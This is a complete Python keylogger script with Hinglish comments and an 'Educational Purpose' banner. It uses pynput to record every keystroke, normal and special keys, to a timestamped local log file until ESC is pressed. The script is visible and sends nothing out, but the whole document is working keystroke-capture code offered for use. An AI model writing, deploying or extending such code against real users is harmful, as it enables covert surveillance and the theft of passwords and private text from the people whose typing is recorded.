import pynput.keyboard
import logging
import os
import datetime

# 1. Advanced Logging Setup
# Ye code keys ko ek file mein date aur time ke sath save karega
log_dir = "" 
logging.basicConfig(filename=(log_dir + "key_log.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Normal characters (a, b, c, 1, 2, 3)
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        # Special keys (Space, Enter, Shift, etc.)
        logging.info(f"Special Key Pressed: {key}")

def on_release(key):
    # ESC dabane se program band ho jayega
    if key == pynput.keyboard.Key.esc:
        print("\n[!] Stopping Keylogger... Log file saved.")
        return False

# 2. Program Interface
print("--- Advanced Keylogger (Educational Purpose) ---")
print(f"User: {os.getlogin()}")
print(f"Started at: {datetime.datetime.now()}")
print("Status: 🔍 Running... Press 'ESC' to stop and save logs.")

# 3. Start Listening
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()